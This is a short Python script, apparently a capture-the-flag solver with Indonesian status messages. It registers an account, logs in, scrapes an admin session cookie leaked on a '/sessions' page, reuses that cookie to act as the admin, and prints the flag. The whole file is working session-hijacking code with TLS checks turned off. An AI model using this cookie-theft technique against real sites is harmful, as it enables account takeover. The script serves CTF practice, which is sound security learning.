import sys
import requests
from bs4 import BeautifulSoup
import re
import time
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    if len(sys.argv) != 2:
        print("(+) masukan url ctf")
        sys.exit(-1)
    url = sys.argv[1]
    login = url + "login"
    s = requests.session()
    print("(+) mencoba memasuki website")
    r = s.get(url, verify=False)
    if r.status_code == 200:
        print("(+) sudah masuk website")
        register = url + 'register'
        data = {"username": "asd", "password": "asd", "conf_password": "asd"}
        r = s.post(register, data=data, verify=False)
        print("(+) mencoba register akun")
        if r.status_code == 200:
            print("(+) akun sudah ditambahkan")
            time.sleep(2)
            data = {"username": "asd", "password": "asd"}
            print("(+) mencoba login dengan akun yang ditambahkan")
            r = s.post(login, data=data, verify=False)
            if r.status_code == 200:
                print("(+) login berhasil")
                time.sleep(5)
                print("(+) mencoba memcari yang janggal")
                print("(+) menemukan /sessions")
                session = url + 'sessions'
                r = s.get(session, verify=False)
                if r.status_code == 200:
                    print("(+) memasuki session")
                    time.sleep(5)
                    print("(+) mencari session admin")
                    soup = BeautifulSoup(r.text, "html.parser")
                    p = soup.find("p")
                    match = re.search(r"session:([^,\s]+)", p.get_text())
                    if match:
                        cookie = match.group(1)
                        print("(+) ini cookienya = " + cookie)
                        s.cookies.clear()
                        s.cookies.set("session", cookie)
                        r = s.get(url, verify=False, proxies=proxies)
                        if r.status_code == 200:
                            print("(+) berhasil masuk ke admin")
                            soup1 = BeautifulSoup(r.text, "html.parser")
                            flag = soup1.find("p", class_="flag-message")
                            if flag:
                                print("(+) berhasil memnemukan flag = " + flag.get_text(strip=True))

                else:
                    print("gagal")

                    
            
        else:
            print("gagal")



if __name__ == "__main__":
    main()
